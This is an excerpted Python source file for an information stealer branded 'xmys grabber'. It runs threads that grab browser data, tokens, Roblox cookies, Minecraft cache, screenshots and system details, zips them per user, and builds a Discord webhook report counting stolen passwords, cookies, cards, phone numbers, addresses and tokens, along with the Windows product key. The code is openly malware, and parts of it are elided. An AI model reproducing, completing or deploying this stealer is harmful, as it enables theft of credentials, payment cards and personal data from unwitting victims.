...
def update(args):
    for arg in args:
        key, value = arg.split('=')
        if key in config:
            config[key] = json.loads(value) if value.lower() in ["true", "false", "null"] or value.isdigit() else value
        else:
    ...
    def gen_tree(self, path):
        ...
        for dirpath, dirnames, filenames in os.walk(path):
            ...
            for n, f in enumerate(filenames):
                if f == f'xmys-{os.getlogin()}.zip': continue
...
class ticks(functions, internal):
    def __init__(self,useless):
        ...
        threads = [Thread(target=self.screenshot),Thread(target=self.grabMinecraftCache),Thread(target=self.tokenRun),Thread(target=self.grabRobloxCookie),Thread(target=self.getSysInfo)]
        for plt, pth in self.browserpaths.items(): threads.append(Thread(target=self.grabBrowserInfo,args=(plt,pth)))
        for thread in threads: thread.start()
        for thread in threads: thread.join()
        
        if self.exceptions:
            with open(self.tempfolder+'\\errors.txt','w',encoding='utf-8') as f:
    ...
    def tokenRun(self):
        ...
        self.neatifyTokens()
    def getSysInfo(self):
            with open(self.tempfolder+f'\\specs.txt', "w", encoding="utf8", errors='ignore') as f:
...
''')
    ...
    def grabBrowserInfo(self, platform, path):
        if os.path.exists(path):
            ...
            sep = '='*40
            fname = lambda x: f'\\{platform}({x}).txt'
    ...
    def neatifyTokens(self):
        f = open(self.tempfolder+"\\tokens.txt", "w+", encoding="utf8", errors='ignore')
    ...
    def SendInfo(self):
        ...
        _zipfile = os.path.join(self.tempfolder, f'xmys-{os.getlogin()}.zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.tempfolder)
        for dirname, _, files in os.walk(self.tempfolder):
            for filename in files:
                if filename == f'xmys-{os.getlogin()}.zip': continue
        ...
        embed = {
            "username": "xmys grabber",
            "content": "@everyone",
            "avatar_url": "https://cdn.discordapp.com/attachments/1297218588800716871/1303848816151232533/SomnusTheMystic.png?ex=672d3f56&is=672bedd6&hm=55fe5eabd59f78df43c263d92d33b6a0d9d219a7d6b2c4d6328a0f7e30fed85d&",
            "embeds": [
                {
                    "title": "System Information",
                    "description": f"**{os.getlogin()}** - **Computer Name**: {os.getenv('COMPUTERNAME')}",
                    "color": 0x2f3136,
                    "fields": [
                        {
                            "name": "📍 **Location**",
                        ...
                        },
                        {
                            ...
                            "value": f"**{wname}**: {wkey if wkey else 'No Product Key!'}",
                            "inline": False
                        },
                        {
                            "name": "🔒 **Stats**",
                            "value": f"**Passwords Found**: {self.stats['passwords']}\n**Cookies Found**: {self.stats['cookies']}\n**Phones Found**: {self.stats['phones']}\n**Cards Found**: {self.stats['cards']}\n**Addresses Found**: {self.stats['addresses']}\n**Tokens Found**: {self.stats['tokens']}",
                            "inline": False
                        },
                        {
                            "name": "📂 **File Info**",
                            "value": f"**Files**: `{self.fileCount}`\n**File List**: ```ansi\n\u001b[32m{self.files}```",
                            "inline": False
                        },
                        {
                            "name": "⏱️ **Execution Time**",
                            "value": f"Time: `{'{:.2f}'.format(time.time() - self.starttime)}s`",
                            "inline": False
                        }
                    ],
                    "footer": {
                        "text": f"Grabber Stats - {time.strftime('%Y-%m-%d %H:%M:%S')}",
                        "icon_url": "https://cdn.discordapp.com/attachments/1297218588800716871/1303848816151232533/SomnusTheMystic.png?ex=672d3f56&is=672bedd6&hm=55fe5eabd59f78df43c263d92d33b6a0d9d219a7d6b2c4d6328a0f7e30fed85d&"
                    }
                }
            ]
        }
